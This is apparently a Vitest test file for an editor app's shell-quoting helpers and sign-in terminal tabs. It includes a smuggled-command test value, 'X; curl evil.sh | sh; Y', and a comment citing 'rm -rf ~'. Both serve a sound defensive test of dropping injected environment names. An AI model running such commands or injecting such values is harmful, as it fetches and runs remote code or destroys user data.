// @vitest-environment happy-dom
import { beforeEach, describe, expect, it } from "vitest";

// The REAL layout store, deliberately. Mocking it away is what hid the bug
// this file exists to prevent: terminal tabs are a singleton per column, so
// `addTab` usually focuses an existing tab instead of creating the requested
// one — behaviour a `vi.fn()` cannot have.
import { useLayoutStore } from "@/features/layout/stores/layout-store";
import { collectPanes, useTerminalStore } from "../stores/terminal-store";
import { renderHook } from "@testing-library/react";
import {
  closeCommandTerminal,
  openCommandTerminal,
  shellLine,
  shellQuote,
  useCommandTerminalPresence,
} from "./open-command-terminal";

/** A project with one editor tab and no terminal. */
function freshLayout() {
  useLayoutStore.setState({
    tabs: [
      {
        id: "editor:a.ts",
        type: "editor",
        title: "a.ts",
        closable: true,
        dirty: false,
        data: {},
        groupId: "main",
      },
    ],
    groupOrder: ["main"],
    focusedGroupId: "main",
    activeByGroup: { main: "editor:a.ts" },
    activeTabId: "editor:a.ts",
    tabHistory: [],
  });
}

beforeEach(() => {
  useTerminalStore.setState({ tabs: {}, pendingCommands: {}, pendingFocus: null });
  freshLayout();
});

describe("shellLine", () => {
  it("renders a plain command untouched", () => {
    expect(shellLine("cursor-agent", ["login"])).toBe("cursor-agent login");
  });

  /// The agent's binary lives in Atlas's app-data dir, which on macOS has
  /// spaces in it — unquoted, the shell would read it as three commands.
  it("quotes a path with spaces", () => {
    expect(shellLine("/Users/a b/agents/cursor-agent", ["acp", "login"])).toBe(
      "'/Users/a b/agents/cursor-agent' acp login",
    );
  });

  /// Not decoration: the login's environment carries the proxy configuration
  /// and the spawn quirks, so a command run without it reaches the network
  /// differently from the agent it is signing in.
  it("prefixes the environment the login must run with", () => {
    expect(
      shellLine(
        "agent",
        ["login"],
        [
          ["HTTPS_PROXY", "http://proxy:8080"],
          ["ANTHROPIC_API_KEY", ""],
        ],
      ),
    ).toBe("HTTPS_PROXY=http://proxy:8080 ANTHROPIC_API_KEY='' agent login");
  });

  it("quotes an environment value that would otherwise split", () => {
    expect(shellLine("agent", [], [["MSG", "two words"]])).toBe("MSG='two words' agent");
  });

  /// The names come out of the agent's own JSON and land to the LEFT of `=`,
  /// where quoting does not help: `'X; rm -rf ~'=1` is a command, not an
  /// assignment. Anything that is not a plain identifier is dropped.
  it("drops an environment name that is not an identifier", () => {
    expect(
      shellLine(
        "agent",
        ["login"],
        [
          ["X; curl evil.sh | sh; Y", "1"],
          ["GOOD_NAME", "keep"],
        ],
      ),
    ).toBe("GOOD_NAME=keep agent login");
  });

  /// POSIX has no escape inside single quotes: you close, emit an escaped
  /// quote, and reopen.
  it("escapes an embedded single quote the only way a shell accepts", () => {
    expect(shellQuote("it's")).toBe(`'it'\\''s'`);
  });
});

describe("openCommandTerminal", () => {
  /** The command queued for the terminal the panel would actually mount. */
  function queuedIn(tabId: string): string | undefined {
    const tree = useTerminalStore.getState().tabs[tabId];
    const pending = useTerminalStore.getState().pendingCommands;
    const active = tree?.activePaneId;
    const pane = active
      ? collectPanes(tree.root).find((p) => p.id === active)
      : collectPanes(tree!.root)[0];
    const terminalId = pane?.activeTerminalId;
    return terminalId ? pending[terminalId] : undefined;
  }

  it("opens a terminal tab and queues the command in it", () => {
    const opened = openCommandTerminal("agent login", "Sign in — Cursor");

    expect(opened).not.toBeNull();
    const tab = useLayoutStore.getState().tabs.find((t) => t.id === opened!.tabId);
    expect(tab).toMatchObject({ type: "terminal", title: "Sign in — Cursor", closable: true });
    expect(queuedIn(opened!.tabId)).toBe("agent login");
    expect(useTerminalStore.getState().pendingFocus?.tabId).toBe(opened!.tabId);
    // It created the tab (the layout had none), so closing may take it whole.
    expect(opened!.createdTab).toBe(true);
  });

  /// The bug the mocked test could not see. A terminal tab already open in this
  /// column means `addTab` focuses THAT one and never creates the tab whose id
  /// we asked for — so queuing against that id queued against nothing, the
  /// terminal appeared, and the login never ran.
  it("still runs the command when a terminal tab is already open", () => {
    const first = openCommandTerminal("first login", "Sign in");
    expect(first).not.toBeNull();

    const second = openCommandTerminal("second login", "Sign in again");

    // The column's terminal tab is a singleton, so the second hand-off lands
    // in the same tab — and must still reach a terminal.
    expect(second!.tabId).toBe(first!.tabId);
    expect(queuedIn(second!.tabId)).toBe("second login");
    // It did NOT create that tab, so closing it must not take the whole thing.
    expect(second!.createdTab).toBe(false);
  });

  /// A fresh terminal each time: the existing shell may be mid-command, and
  /// typing into it would interleave with whatever the user is doing.
  it("gives the command a terminal of its own", () => {
    const { tabId } = openCommandTerminal("first login", "Sign in")!;
    const before = collectPanes(useTerminalStore.getState().tabs[tabId].root)[0].terminals.length;

    openCommandTerminal("second login", "Sign in again");

    const after = collectPanes(useTerminalStore.getState().tabs[tabId].root)[0].terminals.length;
    expect(after).toBe(before + 1);
  });

  /// Consumed once. A login that re-ran whenever its terminal remounted (HMR,
  /// a tab switch that unmounts the panel) would sign the user in twice.
  it("hands the queued command over exactly once", () => {
    const { terminalId } = openCommandTerminal("agent login", "Sign in")!;
    const { takePendingCommand } = useTerminalStore.getState().actions;

    expect(takePendingCommand(terminalId)).toBe("agent login");
    expect(takePendingCommand(terminalId)).toBeUndefined();
  });

  it("has nothing to hand over for a terminal nobody queued for", () => {
    expect(useTerminalStore.getState().actions.takePendingCommand("pty-nope")).toBeUndefined();
  });

  /// A queued command outlives nothing — and the line can hold an agent's
  /// login, so it must not sit in the store after its terminal is gone.
  it("drops a queued command when its tab is removed", () => {
    const { tabId } = openCommandTerminal("agent login", "Sign in")!;
    expect(Object.keys(useTerminalStore.getState().pendingCommands)).toHaveLength(1);

    useTerminalStore.getState().actions.removeTabs([tabId]);

    expect(useTerminalStore.getState().pendingCommands).toEqual({});
  });
});

/// Cancelling a hand-off has to take the terminal with it. The login CLI is
/// still ALIVE in there, mid-prompt, and the dock that could answer it has just
/// gone — leaving a shell holding a TUI nobody can reach.
describe("closeCommandTerminal", () => {
  it("closes the whole tab when it opened that tab", () => {
    const opened = openCommandTerminal("agent login", "Sign in")!;
    expect(opened.createdTab).toBe(true);

    closeCommandTerminal(opened);

    expect(useLayoutStore.getState().tabs.find((t) => t.id === opened.tabId)).toBeUndefined();
    expect(useTerminalStore.getState().tabs[opened.tabId]).toBeUndefined();
    expect(useTerminalStore.getState().pendingCommands).toEqual({});
  });

  /// The tab was the user's before the login borrowed it, so only the terminal
  /// that was added may go — taking the tab would close their shells too.
  it("closes only its own terminal in a tab it did not open", () => {
    const first = openCommandTerminal("first login", "Sign in")!;
    const second = openCommandTerminal("second login", "Sign in again")!;
    expect(second.createdTab).toBe(false);
    const before = collectPanes(useTerminalStore.getState().tabs[first.tabId].root)[0].terminals;
    expect(before).toContain(second.terminalId);

    closeCommandTerminal(second);

    // The tab survives, and so does the terminal the first login is using.
    expect(useLayoutStore.getState().tabs.find((t) => t.id === first.tabId)).toBeDefined();
    const after = collectPanes(useTerminalStore.getState().tabs[first.tabId].root)[0].terminals;
    expect(after).not.toContain(second.terminalId);
    expect(after).toContain(first.terminalId);
    // Its queued command goes with it; the other one is untouched.
    expect(useTerminalStore.getState().pendingCommands[second.terminalId]).toBeUndefined();
    expect(useTerminalStore.getState().pendingCommands[first.terminalId]).toBe("first login");
  });
});

describe("useCommandTerminalPresence", () => {
  /** Put `tabId` on screen in `group`, and focus that column. */
  function show(group: string, tabId: string | null) {
    useLayoutStore.setState((s) => ({
      activeByGroup: { ...s.activeByGroup, [group]: tabId },
      focusedGroupId: group,
      activeTabId: tabId,
    }));
  }

  it("is visible while its terminal is the tab showing in its column", () => {
    const opened = openCommandTerminal("agent login", "Sign in")!;
    const { result } = renderHook(() => useCommandTerminalPresence(opened));
    expect(result.current).toBe("visible");
  });

  it("is hidden once another tab takes the column", () => {
    // The dock's whole bug: the sign-in is still live, but the terminal it is
    // about is no longer on screen.
    const opened = openCommandTerminal("agent login", "Sign in")!;
    const { result, rerender } = renderHook(() => useCommandTerminalPresence(opened));
    // A terminal opens in the surfaces pane, never the main column.
    const tab = useLayoutStore.getState().tabs.find((t) => t.id === opened.tabId)!;
    show(tab.groupId ?? "main", "editor:a.ts");
    rerender();
    expect(result.current).toBe("hidden");
  });

  it("stays visible when the terminal is in another SPLIT COLUMN that still shows it", () => {
    // Per column, not per window. A terminal in the right-hand split is in
    // plain sight while the user types in a chat on the left, so keying this
    // off the focused tab would hide a dock about a terminal they can see.
    const opened = openCommandTerminal("agent login", "Sign in")!;
    useLayoutStore.setState((s) => ({
      tabs: s.tabs.map((t) => (t.id === opened.tabId ? { ...t, groupId: "right" } : t)),
      groupOrder: ["main", "right"],
      activeByGroup: { main: "editor:a.ts", right: opened.tabId },
      focusedGroupId: "main",
      activeTabId: "editor:a.ts",
    }));
    const { result } = renderHook(() => useCommandTerminalPresence(opened));
    expect(result.current).toBe("visible");
  });

  it("reports a closed tab as closed, never as hidden", () => {
    // The distinction is load-bearing. A caller that hides UI while the
    // terminal is out of sight must still SHOW it when the terminal is gone:
    // there is then nowhere left to finish the login, and that UI is the only
    // way out of it.
    const opened = openCommandTerminal("agent login", "Sign in")!;
    closeCommandTerminal(opened);
    const { result } = renderHook(() => useCommandTerminalPresence(opened));
    expect(result.current).toBe("closed");
  });

  it("reports no terminal at all as closed", () => {
    const { result } = renderHook(() => useCommandTerminalPresence(null));
    expect(result.current).toBe("closed");
  });
});
